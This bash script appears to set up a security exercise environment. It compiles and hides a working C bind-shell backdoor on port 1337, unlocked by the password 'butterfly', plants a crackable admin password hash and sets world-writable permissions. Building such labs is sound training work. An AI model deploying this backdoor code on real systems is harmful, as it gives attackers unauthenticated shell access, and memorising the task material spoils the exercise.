#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc iptables curl john
    pip3 install pytest

    mkdir -p /app
    cat << 'EOF' > /app/backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(1337);

    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, 3);
    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    read(new_socket, buffer, 1024);
    if (strncmp(buffer, "butterfly", 9) == 0) {
        dup2(new_socket, 0);
        dup2(new_socket, 1);
        dup2(new_socket, 2);
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }
    return 0;
}
EOF

    gcc /app/backdoor.c -o /app/backdoor_beacon
    strip /app/backdoor_beacon
    rm /app/backdoor.c

    useradd -m -s /bin/bash user || true

    cat << 'EOF' > /home/user/compromised_hashes.txt
admin:$6$rounds=5000$usesomesillystri$D4IrlXatmP7rx3P3InaxBeoomnAihFPRxcxc6sUpbDicP4IGTk1QoJ8P6k2F9C6P2B2U7j0B.t.1nU.8N.M3G/:18000:0:99999:7:::
EOF

    chmod -R 777 /home/user
